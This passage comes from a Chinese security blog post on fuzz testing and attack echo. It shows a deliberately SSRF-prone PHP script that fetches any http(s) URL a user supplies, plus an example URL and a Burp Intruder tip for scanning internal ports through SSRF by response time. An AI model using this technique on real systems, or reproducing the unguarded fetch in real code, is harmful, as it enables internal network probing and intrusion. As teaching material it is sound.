+<h4 id="Timeout回显"><a href="#Timeout回显" class="headerlink" title="Timeout回显"></a>Timeout回显</h4><p>描述：对于ssrf但是它有个通用的特点就是它发起的请求往往都是有 Apache-HttpClient 这款容器发起的。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> - weiygeek.com/&amp;referer=none  - Apache-HttpClient/x.x (Java x.x minimum; Java/x.x<span class="number">.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试脚本代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_allowed_URL</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    <span class="comment">//可用来防止HTTP头注入</span></span><br><span class="line">    <span class="keyword">if</span> (!$url || !filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//仅允许http或https协议</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?:\/\/.*$/'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_allowed_URL($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'非法'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打开输出缓冲区并获取远程图片</span></span><br><span class="line">ob_start();</span><br><span class="line">$context = stream_context_create(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">'http'</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'follow_location'</span> =&gt; <span class="keyword">false</span> <span class="comment">// don't follow redirects</span></span><br><span class="line">    ))</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//略</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line">$timeout = <span class="number">10</span>;</span><br><span class="line">curl_setopt ($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]);</span><br><span class="line">curl_setopt ($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);</span><br><span class="line">$url = curl_exec($ch);</span><br><span class="line">ob_end_clean();</span><br></pre></td></tr></table></figure></p>
+<p>有两种知识：</p>
+<ul>
+<li>“根据端口的响应时间判断端口是否存活:” <a href="http://192.168.1.1/ssrf.php?url=http://127.0.0.1:$80$" target="_blank" rel="noopener">http://192.168.1.1/ssrf.php?url=http://127.0.0.1:$80$</a><ul>
+<li>Tips:采用Burpsuite测试遍历端口时记得把<code>Intruder attack -- columns -- Response received</code>打勾<figure class="image-box">
+                <a rel=模糊测试之攻击回显 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190813163930.png" target="_blank" title="WeiyiGeek.burpsuiter-SSRF-test" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190813163930.png" alt="WeiyiGeek.burpsuiter-SSRF-test" title="" class=""></a>
+                <p>WeiyiGeek.burpsuiter-SSRF-test</p>
+            </figure></li>
+</ul>
+</li>
+</ul>
+
+        </div>
+        
+  <hr>
+  <p> 欢迎各位志同道合的朋友一起学习交流，如文章有误请在下方留下您宝贵的经验知识，个人邮箱地址<b style="color:#ff654e"><code>【master#weiyigeek.top】</code></b>或者个人公众号<b style="color:#ff654e"><code>【WeiyiGeek】</code></b>联系我。 </p>
+
+  <p> 更多文章来源于<b style="color:#03a9f4">【WeiyiGeek Blog - 为了能到远方，脚下的每一步都不能少】</b>, 个人首页地址( <a style="color: #03a9f4;" href="https://weiyigeek.top" target="_blank"> https://weiyigeek.top </a> )</p>
+
+  <p>专栏书写不易，如果您觉得这个专栏还不错的，请给这篇专栏 <b style="color: red;">【点个赞、投个币、收个藏、关个注，转个发】(人间五大情)</b>，这将对我的肯定，谢谢！。</p>
+
+  <div>
+    <img src="https://www.weiyigeek.top/img/weiyigeek.jpg" class="img-responsive" alt="WeiyiGeek-banner">
+  </div>
+
+  <ul style="font-weight: bolder;">
+    <li>
+      <p><span style="color: #03a9f4">echo&nbsp;&nbsp;"【点个赞】，动动你那粗壮的拇指或者芊芊玉手，亲！"</span></p>
+    </li>
+    <li>
+      <p><span style="color: #ff9201">printf("%s",&nbsp;"【投个币】，万水千山总是情，投个硬币行不行，亲！")</span></p>
+    </li>
+    <li>
+      <p><span style="color: #02a2ff">fmt.Printf("【收个藏】，阅后即焚不吃灰，亲！")&nbsp;&nbsp;</span></p>
+    </li>
+    <li>
+      <p><span style="color:red">console.info("【转个发】，让更多的志同道合的朋友一起学习交流，亲！")</span></p>
+    </li>
+    <li>
+      <p><span style="color: #ff654e">System.out.println("【关个注】，后续浏览查看不迷路哟，亲！")</span></p>
+    </li>
+  </ul>
+
+  <div>
+    <img src="https://www.weiyigeek.top/img/wechat-search.png" class="img-responsive" alt="扫描follow(关注)WeiyiGeek公众号"  width="328" height="149">
+  </div>
+
+  <hr>
+  
+
+
+  <blockquote class="post-copyright">
+    <div class="content">
+      
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2022-03-29T05:39:05.027Z" itemprop="dateUpdated">2022-03-29 13:39:05</time>
+</span><br>
+
+
+        <span>文章原始路径：<a href="https://github.com/WeiyiGeek/blog/edit/master/source/_posts/网安大类/FuzzTesting/模糊测试之攻击回显.md" target="_blank" rel="noopener noreferrer">_posts/网安大类/FuzzTesting/模糊测试之攻击回显.md</a></span><br>
+         <span class="copy-copyright">转载注明出处，原文地址：<a href="/2019/4-17-380.html" target="_blank" rel="external">https://blog.weiyigeek.top/2019/4-17-380.html</a></span><br>本站文章内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a> 
+    </div>
+    <footer>
+      <a href="https://blog.weiyigeek.top">
+        <img src="/img/avatar.jpg" alt="WeiyiGeek">
+        WeiyiGeek
+      </a>
+    </footer>
+  </blockquote>
+
+
+        
+            <div class="page-reward">
+  <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-rectangle waves-light">👍 钟意作者</a>
+</div>
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.weiyigeek.top/2019/4-17-380.html&title=《模糊测试之攻击回显》 — WeiyiGeek Blog&pic=https://blog.weiyigeek.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.weiyigeek.top/2019/4-17-380.html&title=《模糊测试之攻击回显》 — WeiyiGeek Blog&source=[TOC]" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.weiyigeek.top/2019/4-17-380.html" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《模糊测试之攻击回显》 — WeiyiGeek Blog&url=https://blog.weiyigeek.top/2019/4-17-380.html&via=https://blog.weiyigeek.top" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://blog.weiyigeek.top/2019/4-17-380.html" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+          <!-- 评论组件 -->
+
+
+<div id="gitalk-container"></div>
+<script type="text/javascript" src="/js/plugins/gitalk.min.js?v=1.6.6"></script>
+<script type="text/javascript" src="/js/custom/gitalk.init.js?v=1.6.6"></script>
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/4-17-97.html" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">3.Redis基础运维之原理介绍和主从配置</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/4-17-49.html" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">1.Redis数据库基础入门介绍与安装</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#DNSlogFuzz渗透中的使用"><span class="post-toc-number">2.</span> <span class="post-toc-text">DNSlogFuzz渗透中的使用</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Timeout回显"><span class="post-toc-number">3.</span> <span class="post-toc-text">Timeout回显</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+  <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        人间自有五大情【点赞、投币(赞赏)、收藏、关注，转发】, 谢谢看友支持!
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardwechat" src="/img/reward-wechat.jpg" height="228" height="228" alt="打赏二维码">
+            <img id="rewardalipay" src="/img/reward-alipay.png" height="228" height="228" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <!-- <input id="rewardToggle" type="checkbox" class="reward-toggle-check" data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.png"> -->
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+  
+ <!-- 微信公众号关注/文章版权复制 -->
+
+  <div id="btw-mask" style="position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; opacity: 0.7; z-index: 999; background: rgb(0, 0, 0); display:none"></div>
+<div id="btw-modal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 360px; text-align: center; font-size: 13px; background: rgb(255, 255, 255); border-radius: 10px; z-index: 9999; font-family: PingFangSC-Regular, sans-serif;display:none">
+<span id="btw-modal-close-btn" style="position: absolute; top: 5px; right: 15px; line-height: 1.8; font-size: 15px; cursor: pointer; opacity: 0.2; z-index: 9999; color: rgb(0, 0, 0); background: none; border: none; outline: none;">X</span>
+<p id="btw-modal-header" style="margin-top: 40px; line-height: 1.8; font-size: 13px; ">
+<b style="color:#6190e8;">你好朋友,可以关个注吗? ❤ <br> 这将是我持续更新文章的动力源泉，谢谢支持！(๑′ᴗ‵๑) </b> <br> 如不想关注请点击右上角的【X】<br>
+<br>Method 1.Please visit <strong><a href="https://twitter.com/WeiyiGeek" target="_blank" rel="noopener" style="color: rgb(240, 65, 52);text-decoration:underline;">【My Twitter】</a></strong>. There is an article verification code in the homepage.
+<br>方式2.请访问本博主的B站<strong><a href="https://space.bilibili.com/385802642" target="_blank" rel="noopener" style="color: rgb(240, 65, 52);text-decoration:underline;">【WeiyiGeek】</a></strong>首页关注UP主,<br>将自动随机获取解锁验证码。
+<br>方式3.扫一扫下方二维码，关注本站<strong>官方公众号</strong><br>
+回复：<strong style="color: rgb(240, 65, 52);">验证码</strong>
+将获取<strong style="color: rgb(240, 65, 52);">解锁(有效期7天)</strong>本站所有技术文章哟!</p>
+<img src="/img/wechat-search.png" style="width: 300px; margin-top: 10px;">
+<div id="btw-modal-input-code" style="margin-top: 20px; background: rgb(255, 255, 255);">
+  <input id="btw-modal-input" type="number" minlength="4" maxlength="4" placeholder="请输入验证码|Verification Code"
+    style="width: 165px; height: 32px; line-height: 32px; padding: 0px 10px; margin: 0px 10px; font-size: 13px; text-rendering: auto; text-transform: none; cursor: text; outline: none; box-sizing: border-box; border: 1px solid rgb(221, 221, 221); -webkit-appearance: textfield; background-color: white; -webkit-rtl-ordering: logical;"/>
+  <button id="btw-submit-btn" onclick="yzm_vertify()"
+    style="padding: 0px 20px; height: 32px; font-size: 14px; outline: none; border: none; color: rgb(255, 255, 255); background: rgb(222, 104, 109); cursor: pointer;">提
+    交</button> </div>
+<p id="btw-footer" style="margin: 40px 0px 20px; color: rgb(153, 153, 153);">@WeiyiGeek - 为了能到远方，脚下的每一步都不能少</p>
+</div>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://weiyigeek.top" target="_blank">https://weiyigeek.top</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://blog.weiyigeek.top" target="_blank">https://blog.weiyigeek.top</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://weiyigeek.top/img/wechat-search.png" target="_blank">公众账号</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://space.bilibili.com/385802642/article" target="_blank">哔哩哔哩专栏</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://github.com/weiyigeek" target="_blank">个人Github</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://gitee.com/WeiyiGeek" target="_blank">个人Gitee</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.zhihu.com/people/weiyiSec" target="_blank">个人知乎</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.cnblogs.com/WeiyiGeek" target="_blank">博客园</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://my.oschina.net/weiyigeek" target="_blank">OSCHINA</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.toutiao.com/c/user/token/MS4wLjABAAAAqcPSoMqfctaEqJpGSF775eeCjWkrop4AOyLITdMx-L78F5iXzfQcSRM5sY4dq3wR" target="_blank">今日头条</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://blog.csdn.net/u013072756?type=lately" target="_blank">CSDN</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.jianshu.com/u/5199a1104739" target="_blank">简书</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://cloud.tencent.com/developer/user/1389665/articles" target="_blank">腾讯云+云社区</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://cuttlefish.baidu.com/shop/75c5dbd8d15abe23482f4d40" target="_blank">百度文库</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://author.baidu.com/home?from=blog&app_id=1726736601523415" target="_blank">IT极客知识分享</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://blog.51cto.com/weiyigeek" target="_blank">51CTO博客</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://juejin.cn/user/122767337595934" target="_blank">掘金</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://weibo.com/a/hot/7622022703618049_1.html" target="_blank">微博文章</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.xiaohongshu.com/user/profile/627c98bb000000001000e7ba" target="_blank">小红书</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://segmentfault.com/u/weiyigeek" target="_blank">Segmentfault</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.douyin.com/user/MS4wLjABAAAAMSBdMja6XLsdmzafb0RNbFeBemIOk38K1PaOClZeI1Q" target="_blank">抖音主页</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+      <p>
+        <span>WeiyiGeek &copy; 2018 - 2022 <a href="https://weiyigeek.top" target="_blank" rel="noopener">weiyigeek.top</a> All rights reserved. IT唯一极客 版权所有 </span>
+        
+        <span>
+          Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/weiyigeek" target="_blank">mellow</a>
+        </span>
+        
+        <br/>访问统计
+        <span><a href="/sitemap.xml" target="_blank" rel="Sitemaps-站点地图">Sitemaps</a> </span>
+        <span><a href="/baidusitemap.xml" target="_blank" rel="baidusitemaps-百度站点地图">站点地图</a> </span>
+        <!-- 
+  -->
+        <br/>ICP备案号<span><a href="https://beian.miit.gov.cn" target="_blank">渝ICP备2022003447号</a></span>
+        <br/>
+        <div id="cc-myssl-id">
+          <a href="https://myssl.com/blog.weiyigeek.top?from=mysslid" target="_blank" rel="noopener"><img src="https://static.myssl.com/res/images/myssl-id1.png" alt="MySSL安全认证" style="max-height:50px;display:block;margin:0 auto"></a>
+        </div>
+      </p>
+    </div>
+</footer>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.weiyigeek.top/2019/4-17-380.html&title=《模糊测试之攻击回显》 — WeiyiGeek Blog&pic=https://blog.weiyigeek.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.weiyigeek.top/2019/4-17-380.html&title=《模糊测试之攻击回显》 — WeiyiGeek Blog&source=[TOC]" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.weiyigeek.top/2019/4-17-380.html" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《模糊测试之攻击回显》 — WeiyiGeek Blog&url=https://blog.weiyigeek.top/2019/4-17-380.html&via=https://blog.weiyigeek.top" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://blog.weiyigeek.top/2019/4-17-380.html" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACL0lEQVR42u3aQW7DMAxEUd//0u66KOz8Ie0Gor5XRVsoelnQ4lDHgZ/z4vn716v/v1rz6lOONx4ZMmQsyzhvn/ttcczV1q/W4XuTIUPGPoza0veFknx8ny1DhgwZ5BhXOzLeryxDhgwZ/YKLlgYN6pffGzJkyFiKQUonD9dI0Mab5Id7cRkyZCzI4Kn7///8ynxDhgwZSzHO8CHBPSnQ/Z38WlOGDBmjGbzAdcJ93tDW9iNDhowdGGn0z2H9AI7/RoYMGbMZaRzPYy8e+vMj5of3hgwZMsYx+kc9UqZTWDxakCFDxpYMUkDTppR/HekXIUOGjNkMHsrzceb9EZMf/tDW09mCDBkyRjCKWV14IyIt5egFIEOGjKGM+zaSBGHpeKA2SPiwjgwZMjZg1IL7WgNMBgBxwyxDhozRjH7Q32mG+RAiPpLKkCFjHKMzsEw7Zn75LB6sypAhYyij03byUWV/hdZbQoYMGYszOoEXj+f6rXJwTJQhQ8ZoBr9OUTtQ1q5i8GscMmTImM1Il6uNNtPLZGlUJ0OGjB0YaXCfRmPPlngZMmTsyUivODxbZDtDVhkyZMxmnOHz1AUL3hKj4itDhozRjM5kkJfpNPnrB3wyZMiYx0gPdrXWNB1SpiVbhgwZOzDS5jb9sGBDtXtfMmTIkPHQ4S8dLaDhpQwZMmTgOKxWKEmHjT5dhgwZGzBIE9vZeq28vhK3yZAhY0FG56YGj+HSsShpmGXIkLEB4wchNCLgQckXKgAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="/js/jquery/2.1.0-jquery.min.js?v=1.6.6"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.6.6"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.6.6"></script>
+<script type="text/javascript" src="/js/jquery/3.5.2-jquery.fancybox.min.js?v=1.6.6"></script>
+<!--  //cdn.bootcss.com/node-waves/0.7.4/waves.min.js -->
+<script type="text/javascript" src="/js/node-waves/0.7.4-waves.min.js?v=1.6.6"></script> 
+
+<script type="text/javascript" src="/js/method.js?v=1.6.6"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.6.6"></script>
+
+<!-- third-party -->
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.6.6"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) { search_path = "search.xml";}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script> 
+
+<!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> --> 
+
+
+
+  
+
+
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    // 百度统计
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?53923c4b5560739bc0ed61e183be6acf";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+ 
+
+
+<!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.staticfile.org/mathjax/2.7.9/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+ 
+<script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = 'WeiyiGeek Blog-关注于网络安全_物联网安全开发_网络安全运维-学习心得分享';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)咦!又好了!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+ 
+     <script type="text/javascript" src="/js/custom/copytips.js?v=1.6.6"></script> 
+</body>
+</html>
